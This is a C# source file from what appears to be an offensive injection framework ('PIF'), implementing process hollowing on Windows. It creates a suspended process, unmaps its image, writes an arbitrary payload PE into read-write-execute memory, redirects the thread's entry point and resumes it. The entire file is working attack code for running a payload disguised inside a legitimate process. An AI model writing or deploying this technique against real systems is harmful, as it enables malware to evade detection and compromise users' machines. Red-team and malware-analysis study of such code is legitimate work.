using PIF.Misc;
using System;
using System.Runtime.InteropServices;

namespace PIF.Inject.PE {
    internal class ProcessHollowing {
        public static void Invoke(Init pif) {
            if (pif.targetType != "Executable") {
                PIFException.Throw("Target must be a file path.");
            }

            Output.Write("Creating suspended target process");
            if (!Helpers.NewProcess(pif, out PInvoke.PROCESS_INFORMATION pInfo, true)) {
                PIFException.Throw("Failed to create process.");
            }
            IntPtr hProcess = pInfo.hProcess;

            Output.Write("Querying target PEB and reading image base");
            if (!Helpers.GetProcessPEB(hProcess, out PInvoke.PROCESS_BASIC_INFORMATION pbi)) {
                PIFException.Throw("Failed to get target process PEB.");
            }
            IntPtr targetImageBaseOffset = IntPtr.Add(pbi.PebBaseAddress, 0x10);
            IntPtr targetImageBase = Marshal.AllocHGlobal(0x8);
            if (!PInvoke.ReadProcessMemory(hProcess, targetImageBaseOffset, targetImageBase, 0x8, out _)) {
                PIFException.Throw("Failed to read image base.");
            }

            Output.Write("Unmapping the target process image base");
            if (PInvoke.ZwUnmapViewOfSection(hProcess, (IntPtr)Marshal.ReadInt64(targetImageBase)) != 0) {
                PIFException.Throw("Failed to unmap image base.");
            }

            Output.Write("Allocating memory buffer and copying payload");
            IntPtr plBuffer = Marshal.AllocHGlobal(pif.payloadBytes.Length);
            Marshal.Copy(pif.payloadBytes, 0, plBuffer, pif.payloadBytes.Length);

            Output.Write("Getting payload DOS/NT headers and writing into target process");
            Helpers.GetPEHeaders(plBuffer, out PInvoke.PE_HEADERS peHeaders);
            IntPtr plRemoteBuffer = PInvoke.VirtualAllocEx(hProcess, (IntPtr)peHeaders.ntHeaders.OptionalHeader.ImageBase, peHeaders.ntHeaders.OptionalHeader.SizeOfImage, 0x3000, 0x40);
            if (plRemoteBuffer == IntPtr.Zero) {
                PIFException.Throw("Failed to allocate memory in target process.");
            }
            if (!PInvoke.WriteProcessMemory(hProcess, plRemoteBuffer, plBuffer, peHeaders.ntHeaders.OptionalHeader.SizeOfHeaders, out _)) {
                PIFException.Throw("Failed to write to target process.");
            }

            Output.Write("Copying PE sections into target process");
            foreach (PInvoke.IMAGE_SECTION_HEADER peSection in Helpers.GetPESections(plBuffer, peHeaders)) {
                if (!Helpers.WritePESection(hProcess, plBuffer, peHeaders, peSection)) {
                    PIFException.Throw("Failed to copy sections into target process.");
                }
            }

            Output.Write("Updating image base address in target process");
            byte[] plImageBaseBytes = BitConverter.GetBytes(peHeaders.ntHeaders.OptionalHeader.ImageBase);
            if (!PInvoke.WriteProcessMemory(hProcess, targetImageBaseOffset, plImageBaseBytes, 0x8, out _)) {
                PIFException.Throw("Failed to write new image base address.");
            }

            Output.Write("Updating thread context and resuming process");
            PInvoke.CONTEXT targetThreadContext = new PInvoke.CONTEXT { ContextFlags = PInvoke.CONTEXT_ALL };
            PInvoke.GetThreadContext(pInfo.hThread, ref targetThreadContext);
            targetThreadContext.Rcx = (ulong)(plRemoteBuffer.ToInt64() + peHeaders.ntHeaders.OptionalHeader.AddressOfEntryPoint);
            PInvoke.SetThreadContext(pInfo.hThread, ref targetThreadContext);

            PInvoke.ResumeThread(pInfo.hThread);
        }
    }
}
